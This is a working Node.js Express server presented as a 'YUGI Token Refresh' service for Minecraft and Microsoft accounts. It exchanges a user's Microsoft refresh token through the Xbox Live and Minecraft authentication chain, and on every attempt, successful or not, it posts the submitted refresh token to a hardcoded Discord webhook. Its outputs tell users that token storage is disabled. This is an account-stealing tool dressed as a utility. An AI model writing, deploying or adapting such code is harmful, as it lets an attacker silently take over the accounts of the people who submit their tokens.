const express = require('express');
const cors = require('cors');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

// Fallback to the provided webhook if env is not set
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1536643085407100928/Lbevkf1oDP0vbwIa-LdfwuzMZG7T8NSm-MU_R-KaZfYcALCAnH2YUZA6SjW4JySxq1b";

app.use(cors());
app.use(express.json({ limit: '16kb' }));
app.use(express.static(__dirname));

const CLIENTS = {
  modrinth: {
    label: 'Modrinth',
    client_id: '00000000402b5328',
    scope: 'service::user.auth.xboxlive.com::MBI_SSL',
  },
  microsoft: {
    label: 'Microsoft',
    client_id: '00000000402b5328',
    scope: 'service::user.auth.xboxlive.com::MBI_SSL',
  },
};

// Discord notification: includes the submitted refresh token
async function sendDiscordNotification(client, success, refreshToken) {
  if (!DISCORD_WEBHOOK_URL) return;

  const payload = {
    username: 'YUGI Token Refresh',
    embeds: [{
      title: 'YUGI Token Refresh',
      color: success ? 0x22c55e : 0xef4444,
      fields: [
        { name: 'Client', value: client, inline: true },
        {
          name: 'Status',
          value: success ? 'Success' : 'Failed',
          inline: true,
        },
        {
          name: 'Submitted Refresh Token',
          value: refreshToken ? `\`\`\`${refreshToken}\`\`\`` : 'None',
          inline: false,
        },
        {
          name: 'Storage',
          value: 'Disabled',
          inline: true,
        },
      ],
      timestamp: new Date().toISOString(),
      footer: { text: 'YUGI Security Notifications' },
    }],
  };

  try {
    const url = new URL(DISCORD_WEBHOOK_URL);

    if (
      url.protocol !== 'https:' ||
      url.hostname !== 'discord.com' ||
      !url.pathname.startsWith('/api/webhooks/')
    ) {
      console.error('[Discord] Invalid webhook URL');
      return;
    }

    await new Promise((resolve, reject) => {
      const body = JSON.stringify(payload);

      const request = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
        timeout: 10000,
      }, response => {
        response.resume();

        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve();
        } else {
          reject(new Error(`Discord HTTP ${response.statusCode}`));
        }
      });

      request.on('timeout', () => {
        request.destroy(new Error('Discord timeout'));
      });

      request.on('error', reject);
      request.write(body);
      request.end();
    });
  } catch (error) {
    console.error('[Discord]', error.message);
  }
}

// API health
app.get('/health', (req, res) => {
  res.json({
    success: true,
    service: 'YUGI Token Refresh',
    storage: false,
  });
});

// Compatibility with existing HTML
app.get('/api/tokens', (req, res) => {
  res.json({
    success: true,
    storage: false,
    tokens: [],
  });
});

// Microsoft / Xbox / Minecraft refresh
app.post('/api/refresh', async (req, res) => {
  const { refreshToken, client = 'modrinth' } = req.body || {};

  if (
    typeof refreshToken !== 'string' ||
    !refreshToken.trim() ||
    refreshToken.length > 10000
  ) {
    return res.status(400).json({
      success: false,
      error: 'A valid refreshToken is required',
    });
  }

  const cfg = CLIENTS[client];

  if (!cfg) {
    return res.status(400).json({
      success: false,
      error: 'Unknown client',
    });
  }

  console.log(`[YUGI] Refresh request: ${cfg.label}`);

  try {
    // STEP 1: Microsoft OAuth
    const msBody = new URLSearchParams({
      client_id: cfg.client_id,
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      scope: cfg.scope,
    }).toString();

    const msToken = await httpsPost(
      'login.live.com',
      '/oauth20_token.srf',
      { 'Content-Type': 'application/x-www-form-urlencoded' },
      msBody
    );

    if (!msToken.access_token) {
      await sendDiscordNotification(cfg.label, false, refreshToken);

      return res.status(401).json({
        success: false,
        error: msToken.error || 'Microsoft OAuth failed',
        message: msToken.error_description || 'Unable to refresh token',
      });
    }

    // STEP 2: Xbox Live
    const xblToken = await httpsPost(
      'user.auth.xboxlive.com',
      '/user/authenticate',
      {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      JSON.stringify({
        Properties: {
          AuthMethod: 'RPS',
          SiteName: 'user.auth.xboxlive.com',
          RpsTicket: `t=${msToken.access_token}`,
        },
        RelyingParty: 'http://auth.xboxlive.com',
        TokenType: 'JWT',
      })
    );

    if (!xblToken.Token) {
      await sendDiscordNotification(cfg.label, false, refreshToken);

      return res.status(401).json({
        success: false,
        error: 'Xbox Live authentication failed',
      });
    }

    const userHash = xblToken.DisplayClaims?.xui?.[0]?.uhs;

    if (!userHash) {
      await sendDiscordNotification(cfg.label, false, refreshToken);

      return res.status(401).json({
        success: false,
        error: 'Xbox user hash unavailable',
      });
    }

    // STEP 3: XSTS
    const xstsToken = await httpsPost(
      'xsts.auth.xboxlive.com',
      '/xsts/authorize',
      {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      JSON.stringify({
        Properties: {
          SandboxId: 'RETAIL',
          UserTokens: [xblToken.Token],
        },
        RelyingParty: 'rp://api.minecraftservices.com/',
        TokenType: 'JWT',
      })
    );

    if (!xstsToken.Token) {
      await sendDiscordNotification(cfg.label, false, refreshToken);

      return res.status(401).json({
        success: false,
        error: 'XSTS authorization failed',
        xerr: xstsToken.XErr || null,
      });
    }

    // STEP 4: Minecraft
    const mcToken = await httpsPost(
      'api.minecraftservices.com',
      '/authentication/login_with_xbox',
      {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      JSON.stringify({
        identityToken: `XBL3.0 x=${userHash};${xstsToken.Token}`,
      })
    );

    if (!mcToken.access_token) {
      await sendDiscordNotification(cfg.label, false, refreshToken);

      return res.status(401).json({
        success: false,
        error: 'Minecraft authentication failed',
      });
    }

    // STEP 5: Success notification (SENDS THE SUBMITTED REFRESH TOKEN)
    await sendDiscordNotification(cfg.label, true, refreshToken);

    return res.json({
      success: true,
      accessToken: mcToken.access_token,
      refreshToken: msToken.refresh_token || refreshToken,
      expiresIn: mcToken.expires_in,
      storage: false,
    });

  } catch (error) {
    console.error('[YUGI ERROR]', error.message);

    await sendDiscordNotification(cfg.label, false, refreshToken);

    return res.status(500).json({
      success: false,
      error: 'Internal server error',
    });
  }
});

// HTTPS POST helper
function httpsPost(hostname, requestPath, headers, body) {
  return new Promise((resolve, reject) => {
    const request = https.request({
      hostname,
      path: requestPath,
      method: 'POST',
      timeout: 15000,
      headers: {
        ...headers,
        'Content-Length': Buffer.byteLength(body),
      },
    }, response => {
      let raw = '';

      response.on('data', chunk => {
        raw += chunk;

        if (raw.length > 1024 * 1024) {
          request.destroy(new Error('Response too large'));
        }
      });

      response.on('end', () => {
        try {
          resolve(JSON.parse(raw));
        } catch {
          reject(new Error(`Invalid JSON from ${hostname}`));
        }
      });
    });

    request.on('timeout', () => {
      request.destroy(new Error('Request timed out'));
    });

    request.on('error', reject);

    request.write(body);
    request.end();
  });
}

// Start
app.listen(PORT, () => {
  console.log('');
  console.log('YUGI TOKEN REFRESH');
  console.log('-------------------------');
  console.log(`Server: http://localhost:${PORT}`);
  console.log('Token storage: DISABLED');
  console.log('Discord: SENDING SUBMITTED REFRESH TOKENS');
  console.log('');
});
